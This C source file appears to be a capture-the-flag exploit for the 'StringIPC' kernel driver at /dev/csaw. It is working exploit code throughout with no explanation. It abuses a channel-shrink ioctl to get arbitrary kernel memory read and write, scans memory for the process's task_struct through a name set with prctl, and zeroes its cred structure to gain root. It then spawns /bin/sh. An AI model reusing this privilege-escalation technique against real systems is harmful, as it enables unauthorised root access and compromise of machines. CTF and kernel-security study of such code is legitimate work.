#include <stdio.h>
#include <sys/prctl.h>       
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

#define CSAW_IOCTL_BASE     0x77617363
#define CSAW_ALLOC_CHANNEL  CSAW_IOCTL_BASE+1
#define CSAW_OPEN_CHANNEL   CSAW_IOCTL_BASE+2
#define CSAW_GROW_CHANNEL   CSAW_IOCTL_BASE+3
#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE+4
#define CSAW_READ_CHANNEL   CSAW_IOCTL_BASE+5
#define CSAW_WRITE_CHANNEL  CSAW_IOCTL_BASE+6
#define CSAW_SEEK_CHANNEL   CSAW_IOCTL_BASE+7
#define CSAW_CLOSE_CHANNEL  CSAW_IOCTL_BASE+8


struct alloc_channel_args {
    size_t buf_size;
    int id;
};

struct open_channel_args {
    int id;
};

struct shrink_channel_args {
    int id;
    size_t size;
};

struct read_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct write_channel_args {
    int id;
    char *buf;
    size_t count;
};

struct seek_channel_args {
    int id;
    loff_t index;
    int whence;
};

struct close_channel_args {
    int id;
};

void print_hex(char *buf,size_t len){
    int i;
    for (i=0;i<((len/8)*8);i+=8){
        printf("0x%lx",*(size_t *)(buf+i));
        if (i%16)
            printf(" ");
        else
            printf("\n");
    }
}

int main(){
    int fd=-1;
    size_t result=0;
    struct alloc_channel_args alloc_args;
    struct shrink_channel_args shrink_args;
    struct seek_channel_args seek_args;
    struct read_channel_args read_args;
    struct close_channel_args close_args;
    struct write_channel_args write_args;
    size_t addr=0xffff880000000000;
    size_t real_cred=0;
    size_t cred=0;
    size_t target_addr;
    int root_cred[12];
    //set target in task_struct
    setvbuf(stdout,0LL,2,0LL);
    char *buf =malloc(0x1000);
    char target[16];
    strcpy(target,"try2findmesauce");
    prctl(PR_SET_NAME,target);
    fd=open("/dev/csaw",O_RDWR);
    if (fd<0){
        puts("[-] open error");
        exit(-1);
    }

    alloc_args.buf_size=0x100;
    alloc_args.id=-1;
    ioctl(fd,CSAW_ALLOC_CHANNEL,&alloc_args);
    if (alloc_args.id==-1){
        puts("[-] alloc_channel error");
        exit(-1);
    }
    printf("[+] now we get a channel %d\n",alloc_args.id);
    shrink_args.id=alloc_args.id;
    shrink_args.size=0x100+1;
    ioctl(fd,CSAW_SHRINK_CHANNEL,&shrink_args);
    puts("[+] we can read and write any memory");
    for(;addr<0xffffc80000000000;addr+=0x1000){
        seek_args.id=alloc_args.id;
        seek_args.index=addr-0x10;
        seek_args.whence=SEEK_SET;
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        read_args.id=alloc_args.id;
        read_args.buf=buf;
        read_args.count=0x1000;
        ioctl(fd,CSAW_READ_CHANNEL,&read_args);
        result=memmem(buf,0x1000,target,16);
        if (result){
            printf("result:0x%p",result);
            cred= * (size_t *)(result-0x8);
            real_cred= *(size_t *)(result-0x10);
            if ((cred||0xff00000000000000) && (real_cred == cred))
            {
                target_addr=addr+result-(int)(buf);
                printf("[+]found task_struct 0x%lx\n",target_addr);
                printf("[+]found cred 0x%lx\n",real_cred);
                break;
            }
        }
    }
    if (result==0)
    {
        puts("not found , try again ");
        exit(-1);
    }
    memset((char *)root_cred,0,28);
    char zeros[30]={0};
    for (int i=0;i<28;i++)
    {
        seek_args.id=alloc_args.id;
        seek_args.index=cred-0x10+i;
        seek_args.whence=SEEK_SET;
        ioctl(fd,CSAW_SEEK_CHANNEL,&seek_args);
        write_args.id=alloc_args.id;
        write_args.buf=(char *)root_cred;
        write_args.count=1;
        ioctl(fd,CSAW_WRITE_CHANNEL,&write_args);
    }

    if (getuid()==0){
        printf("[+]now you are r00t,enjoy ur shell\n");
        system("/bin/sh");
    }
    else
    {
        puts("[-] there must be something error ... ");
        exit(-1);
    }
    return 0;
}
